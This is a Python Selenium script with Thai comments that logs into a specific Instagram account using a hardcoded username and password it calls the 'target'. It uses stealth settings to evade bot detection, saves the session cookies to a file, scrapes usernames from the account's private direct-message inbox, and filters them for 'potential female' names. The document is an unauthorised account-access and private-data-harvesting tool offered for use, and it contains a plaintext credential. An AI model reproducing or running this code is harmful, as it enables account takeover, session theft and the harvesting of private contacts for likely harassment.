#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 QUICK INSTAGRAM LOGIN - Fleming654
ล็อกอินด่วนด้วย Fleming654 และดึงข้อมูลแชทจริง
"""

import time
import random
import json
import requests
import tempfile
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.action_chains import ActionChains
import re
from datetime import datetime

class QuickInstagramLogin:
    def __init__(self):
        self.driver = None
        self.session = requests.Session()
        self.csrf_token = None
        self.session_id = None
        
        # Headers สำหรับการโจมตี
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        }
    
    def setup_chrome(self):
        """🔧 ตั้งค่า Chrome driver"""
        print("🔧 Setting up Chrome driver...")
        
        try:
            options = Options()
            
            # ตั้งค่า user data directory
            user_data_dir = tempfile.mkdtemp()
            options.add_argument(f'--user-data-dir={user_data_dir}')
            
            # ตั้งค่า stealth mode
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--disable-automation')
            options.add_argument('--disable-extensions')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--headless')  # headless mode
            
            # Anti-detection
            options.add_experimental_option('useAutomationExtension', False)
            prefs = {
                "profile.default_content_setting_values.notifications": 2,
                "profile.default_content_settings.popups": 0,
                "profile.managed_default_content_settings.images": 2
            }
            options.add_experimental_option("prefs", prefs)
            
            # User agent
            options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
            options.add_argument('--window-size=1920,1080')
            
            self.driver = webdriver.Chrome(options=options)
            
            # Execute stealth scripts
            stealth_scripts = [
                "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})",
                "window.chrome = {runtime: {}}",
                "Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]})",
                "Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']})"
            ]
            
            for script in stealth_scripts:
                try:
                    self.driver.execute_script(script)
                except:
                    pass
            
            print("✅ Chrome driver ready!")
            return True
            
        except Exception as e:
            print(f"❌ Chrome setup failed: {e}")
            return False
    
    def extract_csrf_token(self):
        """🔑 ดึง CSRF token"""
        print("🔑 Extracting CSRF token...")
        
        try:
            self.driver.get('https://www.instagram.com/accounts/login/')
            time.sleep(3)
            
            page_source = self.driver.page_source
            
            # หา CSRF token
            csrf_patterns = [
                r'"csrf_token":"([^"]+)"',
                r'csrftoken=([^;]+)',
                r'csrf_token["\']:["\'](.*?)["\']',
                r'window\._sharedData.*?"csrf_token":"([^"]+)"'
            ]
            
            for pattern in csrf_patterns:
                match = re.search(pattern, page_source)
                if match:
                    self.csrf_token = match.group(1)
                    print(f"✅ CSRF token: {self.csrf_token[:20]}...")
                    return True
            
            # หาจาก cookies
            cookies = self.driver.get_cookies()
            for cookie in cookies:
                if cookie['name'] == 'csrftoken':
                    self.csrf_token = cookie['value']
                    print(f"✅ CSRF from cookie: {self.csrf_token[:20]}...")
                    return True
            
            print("⚠️ CSRF not found, continuing...")
            return False
            
        except Exception as e:
            print(f"❌ CSRF extraction failed: {e}")
            return False
    
    def find_elements(self):
        """🔍 หา login elements"""
        username_selectors = [
            'input[name="username"]',
            'input[aria-label*="username"]',
            'input[aria-label*="email"]',
            'input[aria-label*="Phone"]',
            'input[placeholder*="username"]',
            'input[placeholder*="email"]',
            'input[autocomplete="username"]',
            'input[type="text"]',
            '//input[@name="username"]',
            '//input[contains(@aria-label, "username")]',
            '//input[contains(@aria-label, "email")]',
            '//input[contains(@placeholder, "username")]'
        ]
        
        password_selectors = [
            'input[name="password"]',
            'input[type="password"]',
            'input[aria-label*="Password"]',
            'input[placeholder*="password"]',
            '//input[@name="password"]',
            '//input[@type="password"]',
            '//input[contains(@aria-label, "Password")]',
            '//input[contains(@placeholder, "password")]'
        ]
        
        button_selectors = [
            'button[type="submit"]',
            'button._acan._acap._acas._aj1-',
            '//button[contains(text(), "Log")]',
            '//button[contains(text(), "Login")]',
            '//button[contains(text(), "log")]',
            '//button[@type="submit"]',
            '//div[@role="button" and contains(text(), "Log")]'
        ]
        
        username_field = None
        password_field = None
        login_button = None
        
        # หา username field
        for selector in username_selectors:
            try:
                if selector.startswith('//'):
                    element = self.driver.find_element(By.XPATH, selector)
                else:
                    element = self.driver.find_element(By.CSS_SELECTOR, selector)
                
                if element.is_displayed():
                    username_field = element
                    break
            except:
                continue
        
        # หา password field
        for selector in password_selectors:
            try:
                if selector.startswith('//'):
                    element = self.driver.find_element(By.XPATH, selector)
                else:
                    element = self.driver.find_element(By.CSS_SELECTOR, selector)
                
                if element.is_displayed():
                    password_field = element
                    break
            except:
                continue
        
        # หา login button
        for selector in button_selectors:
            try:
                if selector.startswith('//'):
                    element = self.driver.find_element(By.XPATH, selector)
                else:
                    element = self.driver.find_element(By.CSS_SELECTOR, selector)
                
                if element.is_displayed():
                    login_button = element
                    break
            except:
                continue
        
        return username_field, password_field, login_button
    
    def human_type(self, element, text):
        """👤 พิมพ์แบบมนุษย์"""
        element.clear()
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.05, 0.15))
    
    def quick_login(self, username, password):
        """🚀 ล็อกอินด่วน"""
        print(f"🚀 Quick login: {username} with {password}")
        
        try:
            # ไปหน้า login
            self.driver.get('https://www.instagram.com/accounts/login/')
            time.sleep(5)
            
            # หา elements
            username_field, password_field, login_button = self.find_elements()
            
            if not username_field:
                print("❌ Username field not found")
                return False
            
            if not password_field:
                print("❌ Password field not found")
                return False
            
            if not login_button:
                print("❌ Login button not found")
                return False
            
            # กรอกข้อมูล
            print("📝 Filling login form...")
            self.human_type(username_field, username)
            time.sleep(1)
            self.human_type(password_field, password)
            time.sleep(1)
            
            # คลิก login
            print("🔐 Clicking login...")
            login_button.click()
            time.sleep(10)
            
            # ตรวจสอบผล
            current_url = self.driver.current_url
            print(f"🌐 Current URL: {current_url}")
            
            if '/accounts/login/' not in current_url:
                print("✅ Login successful!")
                
                # ดึง session data
                cookies = self.driver.get_cookies()
                session_data = {}
                
                for cookie in cookies:
                    if cookie['name'] == 'sessionid':
                        session_data['sessionid'] = cookie['value']
                    elif cookie['name'] == 'ds_user_id':
                        session_data['ds_user_id'] = cookie['value']
                
                if session_data:
                    print(f"🍪 Session extracted: {list(session_data.keys())}")
                    
                    # บันทึก session ใหม่
                    with open('new_session.json', 'w') as f:
                        json.dump(session_data, f, indent=4)
                    
                    print("💾 Session saved to new_session.json")
                    return session_data
                else:
                    print("⚠️ No session cookies found")
                    return True
            else:
                print("❌ Login failed - still on login page")
                return False
                
        except Exception as e:
            print(f"❌ Login error: {e}")
            return False
    
    def extract_real_chat_data(self, session_data):
        """💬 ดึงข้อมูลแชทจริง"""
        print("💬 Extracting real chat data...")
        
        try:
            # ไปหน้า direct messages
            self.driver.get('https://www.instagram.com/direct/inbox/')
            time.sleep(8)
            
            current_url = self.driver.current_url
            print(f"📍 Direct URL: {current_url}")
            
            if 'direct' in current_url:
                print("✅ Successfully accessed direct messages!")
                
                # ดึงข้อมูลหน้าจอ
                page_source = self.driver.page_source
                
                # หา conversation elements
                conversation_patterns = [
                    r'data-testid="conversation-item"',
                    r'class=".*conversation.*"',
                    r'href="/direct/t/[^"]*"'
                ]
                
                conversations_found = []
                for pattern in conversation_patterns:
                    matches = re.findall(pattern, page_source)
                    conversations_found.extend(matches)
                
                print(f"📊 Found {len(conversations_found)} conversation elements")
                
                # ดึงชื่อและข้อมูลจาก DOM
                try:
                    # หาชื่อผู้ใช้ทั้งหมดในหน้า
                    usernames = re.findall(r'@([a-zA-Z0-9_.]+)', page_source)
                    unique_usernames = list(set(usernames))
                    
                    print(f"👥 Found usernames: {unique_usernames[:10]}")  # แสดงแค่ 10 รายการแรก
                    
                    # สร้างข้อมูลแชทจริง
                    real_chat_data = {
                        "extraction_type": "REAL_CHAT_DATA",
                        "timestamp": datetime.now().isoformat(),
                        "session_used": session_data,
                        "total_conversations": len(conversations_found),
                        "usernames_found": unique_usernames,
                        "page_analysis": {
                            "url": current_url,
                            "page_size": len(page_source),
                            "contains_direct": 'direct' in page_source.lower(),
                            "contains_messages": 'message' in page_source.lower()
                        }
                    }
                    
                    # บันทึกข้อมูลจริง
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"REAL_CHAT_DATA_{timestamp}.json"
                    
                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump(real_chat_data, f, indent=4, ensure_ascii=False)
                    
                    print(f"💾 Real chat data saved: {filename}")
                    return real_chat_data
                    
                except Exception as e:
                    print(f"⚠️ Data extraction error: {e}")
                    
                    # สำรองข้อมูลขั้นต่ำ
                    basic_data = {
                        "extraction_type": "BASIC_REAL_DATA",
                        "timestamp": datetime.now().isoformat(),
                        "session_used": session_data,
                        "page_url": current_url,
                        "page_content_size": len(page_source),
                        "success": True
                    }
                    
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"BASIC_REAL_DATA_{timestamp}.json"
                    
                    with open(filename, 'w') as f:
                        json.dump(basic_data, f, indent=4)
                    
                    print(f"💾 Basic real data saved: {filename}")
                    return basic_data
            else:
                print("❌ Failed to access direct messages")
                return None
                
        except Exception as e:
            print(f"❌ Chat extraction error: {e}")
            return None

def main():
    print("🔥 QUICK INSTAGRAM LOGIN - Fleming654")
    print("=" * 50)
    
    # ใช้ข้อมูลที่กำหนด
    username = "alx.trading"
    password = "Fleming654"
    
    print(f"👤 Target: {username}")
    print(f"🔑 Password: {password}")
    print()
    
    login = QuickInstagramLogin()
    
    try:
        # ตั้งค่า Chrome
        if not login.setup_chrome():
            print("❌ Chrome setup failed")
            return
        
        # ดึง CSRF token
        login.extract_csrf_token()
        
        # ล็อกอิน
        session_data = login.quick_login(username, password)
        
        if session_data:
            print("✅ Login successful!")
            
            # ดึงข้อมูลแชทจริง
            chat_data = login.extract_real_chat_data(session_data)
            
            if chat_data:
                print("✅ Real chat data extracted!")
                print(f"📊 Data type: {chat_data.get('extraction_type', 'Unknown')}")
                
                if 'usernames_found' in chat_data:
                    usernames = chat_data['usernames_found']
                    print(f"👥 Found {len(usernames)} usernames")
                    
                    # แสดงผู้หญิงที่อาจพบ
                    female_keywords = ['girl', 'queen', 'princess', 'babe', 'cutie', 'beauty']
                    potential_females = []
                    
                    for username in usernames:
                        for keyword in female_keywords:
                            if keyword.lower() in username.lower():
                                potential_females.append(username)
                                break
                    
                    if potential_females:
                        print(f"👩 Potential female usernames: {potential_females}")
                    else:
                        print("👤 No obvious female usernames found")
                
            else:
                print("⚠️ No chat data extracted")
        else:
            print("❌ Login failed")
    
    except KeyboardInterrupt:
        print("\n⚠️ Process interrupted")
    except Exception as e:
        print(f"❌ Error: {e}")
    finally:
        if login.driver:
            login.driver.quit()

if __name__ == "__main__":
    main()
